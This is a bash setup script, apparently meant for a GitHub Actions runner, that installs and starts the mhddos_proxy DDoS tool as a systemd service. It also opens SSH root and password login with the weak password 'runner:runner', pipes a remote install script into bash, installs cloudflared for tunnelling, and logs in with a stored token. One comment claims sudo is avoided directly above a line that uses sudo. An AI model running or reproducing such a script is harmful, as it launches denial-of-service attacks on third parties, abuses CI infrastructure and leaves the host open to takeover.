#!/bin/bash
set -e

echo "[*] setup system"
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo echo "runner:runner" | chpasswd
sudo systemctl restart ssh

echo "[*] Run install script"
curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s

echo "[*] Install tools"
sudo curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o /usr/local/bin/cloudflared
sudo chmod +x /usr/local/bin/cloudflared
sudo mv cloudflared /usr/local/bin/
sudo gh auth login --with-token <<< "${{ secrets.PAT }}"
sudo gh auth setup-git

echo "[*] Prepare directories"
sudo mkdir -p /mnt/repo/test
sudo chmod 777 /mnt/repo/test

echo "[*] Preparing config"
# 注意：这里不使用 sudo，避免 gh auth 失效
sudo git clone https://github.com/pornnewbee/blue.git /mnt/repo/test

echo "[*] Install Preparing service and binary"
install -Dm644 /mnt/repo/test/itarmy/mhddos.service \
  /etc/systemd/system/mhddos.service

install -Dm755 /mnt/repo/test/itarmy/bin/mhddos_proxy_linux \
  /opt/itarmy/bin/mhddos_proxy_linux

echo "[*] Enable and start service"
systemctl daemon-reload
systemctl enable mhddos.service
systemctl restart mhddos.service

echo "[+] install.sh finished successfully"
